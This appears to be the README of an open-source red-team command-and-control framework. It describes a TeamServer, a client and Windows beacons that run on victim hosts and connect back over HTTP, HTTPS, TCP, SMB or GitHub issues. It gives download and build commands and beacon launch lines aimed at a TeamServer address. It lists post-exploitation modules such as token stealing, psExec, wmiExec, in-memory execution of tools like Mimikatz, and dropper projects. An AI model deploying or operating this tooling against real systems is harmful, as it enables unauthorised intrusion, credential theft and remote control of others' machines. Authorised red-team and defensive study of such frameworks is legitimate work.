# Exploration C2

## What it is

Exploration is a rudimentary redteam Command and Control framework.  
This repository contains the TeamServer and the Client.  
The release includes the TeamServer the Client with preconfigured certificate as well as the beacon and module for windows for [C2Implant](https://github.com/maxDcb/C2Implant).

```
wget -q $(wget -q -O - 'https://api.github.com/repos/maxDcb/C2TeamServer/releases/latest' | jq -r '.assets[] | select(.name=="Release.tar.gz").browser_download_url') -O ./C2TeamServer.tar.gz
mkdir C2TeamServer && tar xf C2TeamServer.tar.gz -C C2TeamServer --strip-components 1
```

## Introduction

The TeamServer is a stand alone application, coded in c++, that handle listeners. The client, coded in python, communicate with the TeamServer through GRPC.  
Beacons run on the victime host. Each Beacons which connects back to the TeamServer open a new session. This session is used to control the Beacon, send commands and receive results.  
Listener and Beacons can communicate through TCP, SMB, HTTP ,HTTPS and Github issues depending on the situation.

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/ListenersAndSessions.png?raw=true)

A compiled version of the TeamServer is ready to use in the Releases, with some default certificats for GRPC communication and HTTP Listener:

The TeamServer binary is in Release/TeamServer  
it's launched using 

```
cd Release/TeamServer  
./TeamServer
```

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/TeamServerLaunch.png?raw=true)

The Python Client is in Release/Client 
It's launched using 'python3 GUI.py'  

```
cd  Release/Client 
python3 GUI.py
```

## TeamServer Listeners

4 types of listeners are available from the TeamServer: HTTP, HTTPS that start a web server on the given port, TCP that start a TCP server on the given port and GitHub that use GitHub issues from a project like "maxDcb/C2TeamServer" and a personal access token (with issues write rights).

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/AddListener.png?raw=true)

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/AddListenerTypes.png?raw=true)

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/Listeners.png?raw=true)


## Beacons

### Windows Beacon

Winodws Beacons and command modules are compiled separately in another [project](https://github.com/maxDcb/C2Implant), but a compiled version is provided in ./Release/Beacons and ./Release/Modules to be able to use it directly.

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/ReleaseModulesBeacons.png?raw=true)

To launch a beacon available in ./Release/Beacons use the following syntax on a windows machine:  

```
.\BeaconHttp.exe IP_TEAMSERVER PORT_LISTENER http/https
.\BeaconHttp.exe 10.10.52.5 8443 https
.\BeaconHttp.exe 10.10.52.5 80 http
```

When the Beacon is started and connect to the TeamServer, a new session is started from where you can interact with the Beacon:

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/NewSession.png?raw=true)

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/SessionInteract.png?raw=true)

Windows beacon uses primarily windows API and start with no module loaded. Modules are loaded at runtime using "MemoryModule" project to load DLL sent by the TeamServer to the beacon.  

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/loadModule.png?raw=true)

| Modules          |
| :--------------- |
| assemblyExec     |
| upload           |
| download         |
| run              |
| script           |
| inject           |
| pwd              |
| cd               |
| ls               |
| ps               |
| makeToken        | 
| rev2self         | 
| stealToken       | 
| coffLoader       |
| loadModule       | 
| powershell       | 
| kerberosUseTicket| 
| psExec           | 
| wmiExec          | 
| spawnAs          | 
| chisel           | 
| tree             | 

AssemblyExec & Inject, that use Donut project, make it possible to launch binary EXE, DLL, managed or unmanaged direclty from memory on the remote host.

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/AssemblyExecMimikatz.png?raw=true)

Coff, that use COFFLoader project, is used to run Coff files.  

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/coffDir.png?raw=true)

Two side projects can be used to deliver the beacons:
* [PowershellWebDelivery](https://github.com/maxDcb/PowershellWebDelivery)
* [PeDropper](https://github.com/maxDcb/PeDropper)


### Linux Beacon

A very basic Linux Beacons coded in python and can be found here: [C2ImplantPy](https://github.com/maxDcb/C2ImplantPy).

An other very basic Linux Beacons coded in Nim and can be found here: [C2ImplantPy](https://github.com/maxDcb/C2ImplantNim).


## Build the TeamServer

### Sumbodule & External Projects:  

* [Donut](https://github.com/TheWover/donut): Creat shellcode from PE files.  
* [cpp-httplib](https://github.com/yhirose/cpp-httplib): Http and Https Listener.  
* [CoffLoader](https://github.com/trustedsec/COFFLoader): Run object files from [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF).
* [MemoryModule](https://github.com/fancycode/MemoryModule): Load DLL at runtime.
* [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell): Powershell for unmanaged code.
* [cpp-base64](https://github.com/ReneNyffenegger/cpp-base64): base64.
* [json](https://github.com/nlohmann/json): json parser.


### Build

```
sudo apt install gcc-mingw-w64
sudo apt install g++-mingw-w64
sudo apt install golang-cfssl
sudo apt install cmake 

pip3 install pycryptodome
pip install conan
pip install grpcio
pip install PyQt5
pip install pyqtdarktheme
pip install protobuf

conan profile detect

git clone https://github.com/maxDcb/C2TeamServer.git
cd C2TeamServer
git submodule update --init

mkdir build
cd build
cmake ..
make -j4
```

The TeamServer binary is in ./Release/TeamServer  
it's launched using './TeamServer'  

The Python Client is in ./Release/Client  
It's launched using 'python3 GUI.py'  

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/ReleaseTeamServerClient.png?raw=true)

